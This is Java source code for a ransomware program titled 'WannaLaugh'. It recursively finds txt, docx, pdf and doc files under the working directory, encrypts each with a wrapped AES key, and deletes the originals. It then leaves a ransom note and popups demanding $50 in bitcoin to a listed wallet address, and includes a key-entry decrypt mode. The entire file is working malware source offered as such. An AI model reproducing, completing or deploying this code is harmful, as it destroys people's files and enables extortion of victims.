package randsom;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.stream.Collectors;
import java.util.stream.Stream;

import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JOptionPane;
import javax.swing.event.ListSelectionEvent;


public class fileReader {
	
	private static chiper c;
	private static String aesKeyString;
	private static HashSet<String> types;
	private static ArrayList<byte[]> filehashes;
	private static int counter;
	private static boolean decryptMode = false;
	
	static String warning = "Hey! Your files are now encrypted.\n" 
			+ "Please send $50 USD worth of bitcoin\n"
			+ "to this bitcoin account: \n\n"
			+ "bc1quum7ledvpnh7grlruerf2jxrjptq60r7sqjcyc \n\n"
			+ "to retrieve your decryption key!";
	static final JFrame frame = new JFrame();
	
	public static void main(String args[]) {
		
		c = new chiper();
		types = new HashSet<>(Arrays.asList("txt", "docx", "pdf", "doc"));
		filehashes = new ArrayList<>();
		ArrayList<File> files = new ArrayList<>();
		getFile(new File(System.getProperty("user.dir")), files);
		
		
		if(decryptMode) {
			String privateKey = JOptionPane.showInputDialog("Enter your decryption key: ");
			if(privateKey != null) {
				c.privateInit(privateKey);
				decryptAlldoc(files);
			}
			
		}
		else {
			encryptAlldoc(files);
			ReadMe();
			JOptionPane.showMessageDialog(frame, warning, "WannaLaugh!!!", JOptionPane.WARNING_MESSAGE, null);
			JOptionPane.showMessageDialog(frame, warning, "WannaLaugh!!!", JOptionPane.WARNING_MESSAGE, null);
			JOptionPane.showMessageDialog(frame, warning, "WannaLaugh!!!", JOptionPane.WARNING_MESSAGE, null);
		}
		
	}
	
	private static void ReadMe() {
		
		try {
			DataOutputStream writer;
			writer = new DataOutputStream( new FileOutputStream("HOW_TO_DECRYPT_YOUR_FILES.txt"));
			writer.writeUTF("*** TO DECRYPT YOUR FILES ***\n");
			writer.writeUTF("*** SEND MONEY $50 USD WORTH OF BITCOIN ***\n");
			writer.writeUTF("*** TO THIS BITCOIN ACCOUNT ***\n");
			writer.writeUTF("*** bc1quum7ledvpnh7grlruerf2jxrjptq60r7sqjcyc ***\n");
			writer.writeUTF("*** TO RETRIEVE THE DECRYPTION KEY ***\n");
			writer.flush();
			writer.close();			
		}
		catch(Exception ex) {}
	}
	
	private static void getFile(File dir, List<File> files) {
		try {
			for(File f : dir.listFiles()) {
				if(f.isDirectory())
					getFile(f, files);
				else if(f.isFile()) {
					String fileName = f.getName();
					String ext = fileName.substring(fileName.lastIndexOf('.') + 1);
					if(!decryptMode && fileName.startsWith("Encrpyted-"))
						decryptMode = true;
					if(types.contains(ext) && !fileName.equals("HOW_TO_DECRYPT_YOUR_FILES.txt")){
						files.add(f);
					}
				}
			}
		}catch(Exception ex) {}
	}
	
	public static void encryptAlldoc(ArrayList<File> files) {
		
		try {
			DataInputStream reader;
			DataOutputStream writer;
			//MessageDigest hash = MessageDigest.getInstance("SHA-256");
			for(File f : files) {

				reader = new DataInputStream(new FileInputStream(f));
				int size = reader.available();
				byte[] data = new byte[size];
				reader.read(data);
				c.aesKeyGen();
				byte[] edata = c.encrypt(data);
				
				//filehashes.add(hash.digest(data));
				reader.close();
				f.delete();
				//Create Encrpyted File
				writer = new DataOutputStream( new FileOutputStream(f.getParent() + "\\Encrpyted-" + f.getName()));
				writer.write(c.getencrpytAESKey());
				writer.write(c.getIV());
				writer.write(edata);
				writer.flush();
				writer.close();
				counter++;
					
			}		
		}
		catch(Exception ex) {}
		
	}
	
	public static void decryptAlldoc(ArrayList<File> files) {
		
		try {
			DataInputStream reader;
			DataOutputStream writer;
			//MessageDigest hash = MessageDigest.getInstance("SHA-256");
			for(File f : files) {
				if(f.getName().startsWith("Encrpyted-")) {
					reader = new DataInputStream(new FileInputStream(f));
					int size = reader.available();
					byte[] aeskey = new byte[128];
					byte[] IV = new byte[16];
					byte[] data = new byte[size - 144];
					
					reader.read(aeskey, 0, 128);
					reader.read(IV, 0, 16);
					reader.read(data, 0, size - 144);
					c.setIV(IV);
					c.decrpytAESKey(aeskey);
					byte[] ddata = c.decrypt(data);

					reader.close();
					f.delete();
					writer = new DataOutputStream( new FileOutputStream(f.getParent() + "\\" + f.getName().substring(10)));
					writer.write(ddata);
					writer.flush();
					writer.close();
				}
			}
		}catch(Exception ex) {
			JOptionPane.showMessageDialog(frame, "TRY AGAIN!", "WRONG PASSWORD!!!", JOptionPane.WARNING_MESSAGE, null);
		}
		
	}
	
}
